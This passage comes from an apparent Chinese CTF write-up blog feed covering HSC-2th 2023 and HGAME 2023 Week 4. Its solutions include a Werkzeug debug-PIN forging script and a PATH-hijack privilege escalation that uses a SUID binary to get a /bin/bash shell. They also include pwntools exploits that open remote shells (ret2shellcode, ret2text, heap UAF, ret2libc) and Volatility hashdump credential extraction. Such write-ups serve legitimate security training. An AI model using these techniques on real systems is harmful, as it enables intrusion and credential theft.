class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&#x27;0242ac0208fe&#x27;</span>,<span class="number">16</span>)),<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/1/mountinfo</span></span><br><span class="line">    <span class="string">&#x27;7265fe765262551a676151a24c02b7b6&#x27;</span>+<span class="string">&#x27;bcf34bfb0be38980dddd4de1d57a8b7da2de7843ee55ed110016b97f5163406c&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>输入PIN码进入调试模式，在根目录下发现 <code>/flag</code> 和 <code>/readflag</code>，<code>/flag</code> 无权限读，而 <code>/readflag</code> 有SUID权限，需要提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo \&quot;/bin/bash\&quot;&gt;ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /</span><br><span class="line">./readflag</span><br></pre></td></tr></table></figure><p>输入 <code>print(os.popen(&quot;cd /tmp;echo \&quot;/bin/bash\&quot;&gt;ps;chmod 777 ps;echo $PATH;export PATH=/tmp:$PATH;cd /;./readflag&quot;).read())</code> 得flag。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="DECOMPILEONEOONE"><a href="#DECOMPILEONEOONE" class="headerlink" title="DECOMPILEONEOONE"></a>DECOMPILEONEOONE</h3><p>照代码逻辑还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x5C797E8971697066</span>,<span class="number">0x8D83497D7F6F7A3D</span>,<span class="number">0x949DA8758277A9A5</span>,<span class="number">0xB7954D7C</span>]</span><br><span class="line">cc = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    <span class="keyword">if</span> (i&amp;<span class="number">1</span>)!=<span class="number">0</span>:</span><br><span class="line">        cc[i] = cc[i]+i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cc[i] = cc[i]+i</span><br><span class="line">    cc[i] ^= i + <span class="number">1</span></span><br><span class="line">    cc[i] -= <span class="number">3</span> * i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;reV3rSe_1s_sucH_hanD1e&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Whack-a-mole"><a href="#Whack-a-mole" class="headerlink" title="Whack-a-mole"></a>Whack-a-mole</h3><p>动调过反调试和中间的判断条件，使得流程走向正确的处理函数里，最后在 <code>Source</code> 字符串中查看到已修改得到的字符串：<code>w1n32_aP</code> 和 <code>i_iS_FUn</code>，连接得flag：<code>flag&#123;w1n32_aPi_iS_FUn&#125;</code>。</p><p>​    </p><h3 id="Base-secrets"><a href="#Base-secrets" class="headerlink" title="Base secrets"></a>Base secrets</h3><p>rust程序，比较难看，结合题目 <code>Base</code> 跟踪一下代码逻辑，发现编码后的字符串 <code>hexZh3tyVXM3X2AwX35yM+IxRU1nkz5nmWdzhXdF7Qo=</code>。</p><p>跟进到encode代码部分，提取出码表为 <code>456789+-IJKLMNOPQRSTUVWXghijklmnYZabcdefopqrstuvwxyz0123ABCDEFGH</code>，</p><p>base64解码得flag：<code>flag&#123;rUs7_n0_pr0b1EM_s0_yisey&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="EZPWN"><a href="#EZPWN" class="headerlink" title="EZPWN"></a>EZPWN</h3><p>简单ret2shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10059</span>)</span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x404080</span></span><br><span class="line">pl=asm(shellcraft.sh()).ljust(<span class="number">0x110</span>,<span class="string">&#x27;a&#x27;</span>)+p64(buf2)+p64(buf2)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Morris-II"><a href="#Morris-II" class="headerlink" title="Morris II"></a>Morris II</h3><p>在 <code>main() -&gt; fight_system() -&gt; confirm_input() -&gt; read()</code> 中发现明显的栈溢出漏洞，有backdoor，再ret2text即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10396</span>)</span><br><span class="line"></span><br><span class="line">dontlookatme=<span class="number">0x401236</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;from below：&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;hero\&#x27;s name!:\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(ret)+p64(dontlookatme)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EasyHeap"><a href="#EasyHeap" class="headerlink" title="EasyHeap"></a>EasyHeap</h3><p>类似<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">ctf-wiki的hacknote</a>，UAF菜单题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10575</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./Safe_Program&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">magic = <span class="number">0x80495BD</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) <span class="comment"># show note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Safe-Program"><a href="#Safe-Program" class="headerlink" title="Safe Program"></a>Safe Program</h3><p>ret2libc，需要根据泄露地址查询libc为libc-2.31。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10914</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./Safe_Program&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401393</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x401391</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line">main=<span class="number">0x401247</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;talk to me now:\n\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.send(pl)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym.system</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;talk to me now:\n\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)+p64(main)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h2><h3 id="Happy-Lantern-Festival"><a href="#Happy-Lantern-Festival" class="headerlink" title="Happy Lantern Festival"></a>Happy Lantern Festival</h3><p>图片信息有阿勒泰市第十三届元宵灯会，搜索到举办地为五百里风情街，再在地图搜具体地址。</p><p><code>HSCSEC&#123;新疆维吾尔自治区阿勒泰地区阿勒泰市五百里风情街&#125;</code></p><p>​    </p><h3 id="Beautiful-Lake"><a href="#Beautiful-Lake" class="headerlink" title="Beautiful Lake"></a>Beautiful Lake</h3><p>放大图片发现宁夏理工学院，搜索宁夏理工学院附近的湖为星海湖，再在地图搜具体地址。</p><p><code>HSCSEC&#123;宁夏回族自治区石嘴山市大武口区星海湖&#125;</code></p><p>​    </p><h3 id="Apple-Store"><a href="#Apple-Store" class="headerlink" title="Apple Store"></a>Apple Store</h3><p>百度识图，搜到地点为apple官方(西单大悦城店)，再在地图搜具体地址。</p><p><code>HSCSEC&#123;北京市西城区西单北大街131号&#125;</code></p><p>​    </p><h3 id="Beautiful-Park"><a href="#Beautiful-Park" class="headerlink" title="Beautiful Park"></a>Beautiful Park</h3><p>百度识图，搜到新闻：<a href="https://www.sohu.com/a/540130745_121365332">华北最大的湿地公园位于碧桂园官厅蓝北侧 五一假期来这里玩水乘凉 看海棠花吧</a>，得到公园名，再在地图搜具体地址。</p><p><code>HSCSEC&#123;河北省张家口市怀来县官厅水库国家湿地公园&#125;</code></p><p>​    </p><h3 id="Boat"><a href="#Boat" class="headerlink" title="Boat"></a>Boat</h3><p>百度识图定位杭州西湖，再在地图搜具体地址。</p><p><code>HSCSEC&#123;浙江省杭州市西湖区龙井路1号&#125;</code></p><p>​    </p><h3 id="Airplane"><a href="#Airplane" class="headerlink" title="Airplane"></a>Airplane</h3><p>飞机图片里信息有B-30EL型号，搜索到新闻：<a href="https://baijiahao.baidu.com/s?id=1685764680862717493&amp;wfr=spider&amp;for=pc">又多了一个中型航空公司 重庆航空第30架飞机入列</a>，里面提到 <code>渝兴快线</code>，再根据地面机场特征，与地图比对，为北京大兴国际机场。</p><p><code>HSCSEC&#123;北京市大兴区大兴国际机场&#125;</code></p><p>​    </p><h3 id="Tower"><a href="#Tower" class="headerlink" title="Tower"></a>Tower</h3><p>百度识图为澳门埃菲尔铁塔，在地图搜具体地址，多次尝试才正确。</p><p><code>HSCSEC&#123;澳门特别行政区路氹填海区澳门路氹金光大道连贯公路澳门巴黎人&#125;</code></p><p>​    </p><h3 id="Cable-car"><a href="#Cable-car" class="headerlink" title="Cable car"></a>Cable car</h3><p>一眼重庆索道，根据索道和大桥的视角，在地图上找到大致范围，在利用地图3D模式，发现靠近江边的楼最高，只可能在这栋楼里，否则挡视线。楼里有标注着山什集，在美团上也能看到类似图片的分享，尝试该具体地址成功。</p><p><code>HSCSEC&#123;重庆市渝中区白象居4号楼9-1号&#125;</code></p><p>​    </p><h3 id="Romantic-firework"><a href="#Romantic-firework" class="headerlink" title="Romantic firework"></a>Romantic firework</h3><p>图片比较模糊，放大查看消防员衣服背后字样，猜测出甘肃消防，再搜索 <code>甘肃 焰火</code>，看到新闻：<a href="https://www.liuyangfc.com/news/18130.html">甘肃省白银市凌空造出两座”火焰山”，浏阳中洲烟花集团5.5万发高空礼花闪耀元宵夜</a>，新闻中有极其相似的照片；地点为白银城区金岭公园，再在地图搜具体地址。</p><p><code>HSCSEC&#123;甘肃省白银市白银区金岭公园&#125;</code></p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8&lt;/p&gt;
&lt;p&gt;本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖we</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 4</title>
    <link href="https://lazzzaro.github.io/2023/02/06/match-HGAME-2023-Week-4/"/>
    <id>https://lazzzaro.github.io/2023/02/06/match-HGAME-2023-Week-4/</id>
    <published>2023-02-06T13:43:16.000Z</published>
    <updated>2023-02-07T12:07:47.828Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)<br>线上赛平台：<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭<br>本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址<br>比赛奖金(针对校外榜)：<br>第1名：1000Pwnhub金币<br>第2名：800Pwnhub金币<br>第3名：600Pwnhub金币<br>4-10名：300Pwnhub金币<br>补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个<br>注意：<br>* 所有选手均以个人为单位参赛；<br>* 在解题过程中遇到瓶颈或困难可以私聊出题人<br>* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。<br>* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。<br>* 每周比赛结束后本周前20名需提交wp到指定邮箱<br>本比赛最终解释权归 Vidar-Team 所有</p><p><strong>Rank: 9</strong> / <strong>Total Rank: 8</strong></p><hr><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ezWin-variables-auth-7zip"><a href="#ezWin-variables-auth-7zip" class="headerlink" title="ezWin (variables/auth/7zip)"></a>ezWin (variables/auth/7zip)</h3><blockquote><p>非常常规的 Windows 内存取证，请使用 volatility3 </p><p>注：系列题目使用同一个镜像，使用下方任意链接下载一次即可 </p><p><a href="https://pan.baidu.com/s/1FDQeEVFSSznEGpqmWgS47w?pwd=57l8">https://pan.baidu.com/s/1FDQeEVFSSznEGpqmWgS47w?pwd=57l8</a> </p><p><a href="https://pan.quark.cn/s/9418099763d7">https://pan.quark.cn/s/9418099763d7</a> </p><p><a href="https://mega.nz/file/KzIigTKR#PqV-l7LX5X4pmBHFJQVE8g2mFS60XCbQjTmw-el92ts">https://mega.nz/file/KzIigTKR#PqV-l7LX5X4pmBHFJQVE8g2mFS60XCbQjTmw-el92ts</a></p></blockquote><p>使用volatility3分析Windows 10镜像。</p><p><strong>1. variables</strong></p><p>查看环境变量：</p><p><code>python vol.py -f win10_22h2_19045.2486.vmem windows.envars</code></p><p>得到第1个flag值：<code>hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</code>。</p><p><strong>2. 7zip</strong></p><p>查找7z文件：</p><p><code>python3 vol.py -f win10_22h2_19045.2486.vmem windows.filescan | grep -i 7z</code></p><p>找到 <code>flag.7z</code>，导出：</p><p><code>python3 vol.py -f win10_22h2_19045.2486.vmem windows.dumpfiles --virtaddr 0xd0064181c950</code></p><p>打开发现需要密码，内含文件 <code>crack_nt_hash_for_7z_pwd.txt</code>，文件名即提示，需要破解NTHash值得到解压密码。</p><p>提取账户信息：</p><p><code>python3 vol.py -f win10_22h2_19045.2486.vmem windows.hashdump</code></p><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Noname  1000    aad3b435b51404eeaad3b435b51404ee        84b0d9c9f830238933e7131d60ac6436</span><br></pre></td></tr></table></figure><p>使用cmd5查询得到 <code>84b0d9c9f830238933e7131d60ac6436</code> 对应明文为 <code>asdqwe123</code>，解压得到flag：<code>hgame&#123;e30b6984-615c-4d26-b0c4-f455fa7202e2&#125;</code>。</p><p><strong>3. auth</strong></p><p>查看命令行历史记录：</p><p><code>python vol.py -f win10_22h2_19045.2486.vmem windows.cmdline</code></p><p>发现提示 <code>flag2 is current user nthash...</code>，根据上一题hashdump得到的结果，flag为：<code>hgame&#123;84b0d9c9f830238933e7131d60ac6436&#125;</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LLLCG"><a href="#LLLCG" class="headerlink" title="LLLCG"></a>LLLCG</h3><blockquote><p>“我保留了大部分LCG的特征，但是也去除了一部分，这样才知道你们需要用到LLL”，”你是有意把它去除的吗”，”是出题的过程中我去除了一部分”，”是故意的还是不小心”，”是故意的”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.n = next_prime(<span class="number">2</span>**<span class="number">360</span>)</span><br><span class="line">        self.a = bytes_to_long(flag)</span><br><span class="line">        self.seed = randint(<span class="number">1</span>, self.n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = self.seed * self.a + randint(-<span class="number">2</span>**<span class="number">340</span>, <span class="number">2</span>**<span class="number">340</span>) % self.n</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">lcg = LCG()</span><br><span class="line"></span><br><span class="line">outputs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    outputs.append(lcg.<span class="built_in">next</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(outputs))</span><br></pre></td></tr></table></figure></blockquote><p>出题失误，<code>self.seed = self.seed * self.a + randint(-2**340, 2**340) % self.n</code> 该句代码未加括号，且 $r \in [-2^{340},2^{340}]&lt; \text{seed} &lt;n$，直接做整除操作可以恢复 $a$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    m = c[i]//c[i-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="string">b&#x27;hgame&#123;W0w_you_know_the_hidden_number_problem&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="LLLCG-Revenge"><a href="#LLLCG-Revenge" class="headerlink" title="LLLCG Revenge"></a>LLLCG Revenge</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">&gt;<span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> next_prime</span><br><span class="line"><span 